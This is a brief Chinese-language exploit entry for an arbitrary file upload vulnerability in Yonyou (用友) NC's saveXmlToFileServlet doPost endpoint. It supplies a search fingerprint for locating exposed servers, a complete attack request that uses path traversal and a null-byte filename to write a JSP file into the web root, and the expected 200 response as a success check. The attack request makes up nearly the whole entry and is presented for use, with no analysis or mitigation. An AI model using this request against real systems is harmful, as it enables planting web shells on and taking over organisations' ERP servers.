# 用友NCdoPost接口任意文件上传漏洞

用友 ｜ 文件上传 ｜ —
- **指纹**：`title="YONYOU NC"`
- **请求**：`POST /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..%5C..%5C..%5Cwebapps%5Cnc_web%5Cdudesite.jsp%00 HTTP/1.1`
- **响应特征**：200